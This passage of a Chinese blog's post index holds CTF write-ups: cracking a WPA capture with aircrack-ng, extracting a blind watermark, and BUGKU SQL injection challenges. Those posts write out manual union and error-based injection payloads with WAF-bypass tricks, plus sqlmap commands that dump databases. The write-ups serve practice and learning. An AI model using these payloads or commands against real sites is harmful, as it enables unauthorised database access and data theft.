流量包解密02&nbsp;&nbsp;果然还是见识少，所有的比赛的束手无措只是自己平时懒所付出的代价。下载下来一看，文件是.cap结尾的格式，那么应该是WiFi所抓下来的包，而且题目提示密码就是本机的MAC地址。那么我们需要用到aircrack-ng工具解密流量。 先用wireshark打开流量包可以看到我们MAC地址（无线&gt;wlan流量） aircrack-ng解密流量，有个坑密码MAC地址大写1-w 使用密码字典 然后将key值导入进去(首选项&gt;protpcols&gt;IEEE 802.11&gt;Decryption key&gt;wpa-key)然后追踪TCP流最后查看网址找到了flag Refererhttps://blog.csdn.net/qq_28208251/article/details/48093575https://xz.aliyun.com/t/1972http://netsecurity.51cto.com/art/201105/264844.htmhttps://blog.csdn.net/dmbjzhh/article/details/79425483 如果有同学需要上述题目，请联系我","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"比赛wp","slug":"比赛wp","permalink":"http://www.r1ght0us.xyz/tags/比赛wp/"},{"name":"CRYPTO","slug":"CRYPTO","permalink":"http://www.r1ght0us.xyz/tags/CRYPTO/"},{"name":"MISC","slug":"MISC","permalink":"http://www.r1ght0us.xyz/tags/MISC/"}]},{"title":"照片里的盲水印","slug":"照片里的盲水印","date":"2018-09-02T06:22:38.000Z","updated":"2019-01-06T09:00:03.697Z","comments":true,"path":"2018/09/02/照片里的盲水印/","link":"","permalink":"http://www.r1ght0us.xyz/2018/09/02/照片里的盲水印/","excerpt":"很典型的CTF比赛题目","text":"很典型的CTF比赛题目这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的赛事水平（赛棍？？？）但是这个方面还是要看一下，就当做开发脑力了。 题目：暴力可解题目文件下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是纯数字类型。获得密码，解压得到两张相同的图片。在misc中，两张相同的图片基本上都应该是盲水印，所以使用bwm脚本（python2）。bwm脚本的github运行脚本发现没有cv2这个模块，使用下面的命令安装cv2pip install opencv-python然后运行python bwm.py decode 1.png 2.png flag.png。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"MISC","slug":"MISC","permalink":"http://www.r1ght0us.xyz/tags/MISC/"},{"name":"盲水印","slug":"盲水印","permalink":"http://www.r1ght0us.xyz/tags/盲水印/"}]},{"title":"SQL报错注入","slug":"SQL报错注入","date":"2018-08-17T06:55:49.000Z","updated":"2019-01-06T09:00:12.737Z","comments":true,"path":"2018/08/17/SQL报错注入/","link":"","permalink":"http://www.r1ght0us.xyz/2018/08/17/SQL报错注入/","excerpt":"报错注入需要学习一下","text":"报错注入需要学习一下快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。 这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。 题名：多次，网址链接 首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤?id=1’，页面发生变化，猜测位查询语句为单引号闭合。再次进行测试，?id=1′ or 1=1%23 ，发现并无变化。猜测可能有WAF过滤，于是测试双重写or，?id=1′ oorr 1=1%23 ，测试发现页面改变 进行测试过滤，使用异或符号（^）搭配length函数开始测试。 如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。经测试：or，and，union，select被过滤。那么接下来就是常规测试。 ?id=1%27 oorrder by 2%23，测试列数为2。（注意order里面的or） 爆数据库?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：information里面的or） 爆表?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23 爆出数据?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。 寻找下一关地址?id=-1%27 uniounionn selecselectt 1,address from flag1 %23 找到下一关地址OK，还是向上面的一样测试，发现还是单引号过滤。发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。因为还发现有报错产生，那么我就进行报错盲注测试。 盲注测试公式：union select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x; 其中version()改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。 or (select 1 from(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)a)%23 因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错Operand should contain 1 column(s) , 且(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。解决方法：left((select flag2 from flag2),40)，取前40个字符。 相关链接：https://blog.csdn.net/qq_35544379/article/details/77453019 https://blog.csdn.net/he_and/article/details/80455884 http://wyb0.com/ 两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"SQLinjection","slug":"SQLinjection","permalink":"http://www.r1ght0us.xyz/tags/SQLinjection/"},{"name":"手动注入","slug":"手动注入","permalink":"http://www.r1ght0us.xyz/tags/手动注入/"}]},{"title":"SQLMAP-POST注入","slug":"SQLMAP-POST注入","date":"2018-08-17T05:11:14.000Z","updated":"2019-01-06T08:59:14.452Z","comments":true,"path":"2018/08/17/SQLMAP-POST注入/","link":"","permalink":"http://www.r1ght0us.xyz/2018/08/17/SQLMAP-POST注入/","excerpt":"POST注入+SQLMAP","text":"POST注入+SQLMAPBUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。 抓包，复制出来打成一个txt文件 sqlmap -r test.txt -p admin_name –dbs因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。 -r 指定一个文件。 -p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。 –dbs 爆出所有的数据库。 点击回车运行，竟然发现无法进行sql注入！ 上图是我进行注入失败，后面继续追加了下面的参数 -v 这个是展现攻击测试的详细过程的程度，一般设为3就足够。 –threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。 sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3 如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。 解释参数： –level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –tablesqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。 解释参数： -D 指定数据库。 -T 指定表。 –table 数据库爆表名。 –dump 显示所有字段。 题目地址","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://www.r1ght0us.xyz/tags/kali/"},{"name":"SQLinjection","slug":"SQLinjection","permalink":"http://www.r1ght0us.xyz/tags/SQLinjection/"}]}]}